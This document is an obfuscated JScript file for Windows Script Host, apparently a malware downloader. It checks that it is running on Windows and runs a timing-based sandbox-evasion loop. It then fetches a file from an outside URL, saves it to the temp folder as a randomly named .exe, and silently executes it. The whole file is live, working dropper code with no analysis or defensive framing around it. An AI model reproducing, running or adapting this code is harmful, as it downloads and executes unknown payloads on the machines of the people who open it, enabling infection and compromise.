var _QJ = false;
var _VH = "CreateObject";
var _HR = function _LW() {return WScript[_VH]("WScript"+".Shell");}(), _A = 11;
var _BT = "MSXML2.XMLHTTP";
var _S1 = 2123213;
var _AI = 0;
function _IM(_G){_HR["Run"](_G, _AI, _AI);};
function _XZ(){return _BT + "";};
function _KZ(_N2, _N3){_AI = _AI * 1; return _N2 - _N3;};
function _RB(){return _VH;};
/*@cc_on
  @if (@_win32 || @_win64)
    _QJ = true;
  @end
@*/
if (_QJ)
{
var _SL = "";
function _YY(){return 22;};
var _B0 = 0; var _F = 0;
function _R0()
{
var _AG = new this["Date"]();
var _FL = _AG["getUTCMilliseconds"]();
WScript["Sleep"](_YY());
var _AG = new this["Date"]();
var _B = _AG["getUTCMilliseconds"]();
WScript["Sleep"](_YY());
var _AG = new this["Date"]();
var _N0 = _AG["getUTCMilliseconds"]();
var _B0 = "_T";
_B0 = _KZ(_B, _FL);
var _F = "_BL";
_F = _KZ(_N0, _B);
_SL = "open";
return _KZ(_B0, _F);
}
var _N1 = false;
var _T0 = false;
for (var _TN = _AI; _TN < _YY() * 1; _TN++){if (_R0() != _AI){
_N1 = true; 
_F = "31" + 11 * _B0 + _F; 
_T0 = true; 
break;
}}
function _R() {return ((_N1 == true) && (_N1 == _T0)) ? 1 : _AI;};
if (_N1 && _R() && _T0){
function _N() {return _HR["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "6I9lUxyXo.ex" + "e";};
 _QP = _XZ();
 _R1 = WScript[_VH](_QP);
 var _CP = 1;
 while (_CP){
try {
	if (_CP == 1)
	{
		_R1[_SL]("GET", "http://mentalmathcompetition.com/k4isa", false);
		_R1["send"]();
		_K = "Sleep";
	}
	WScript[_K](_YY() + 120); 
	if (_R1["readystate"] < 2 * 2) continue;
	_CP = _AI;
	function _S(_X) {var _S0 = (1, 2, 3, 4, 5, _X); return _S0;};
	_A0 = WScript[_RB()]("ADODB.Stream");
	_QP = _A0;
	_QP[_SL]();
	_QP["type"] = _S(1);
	_QP["write"](_R1["ResponseBody"]);
	_A0["position"] = _S(_AI);
	_QP["Save" + "ToFile"](_N(), 2);
	_A0["cl"+"ose"]();
	_KW = _N();
	_IM(_KW);
} catch(_PX){};
}
}
}

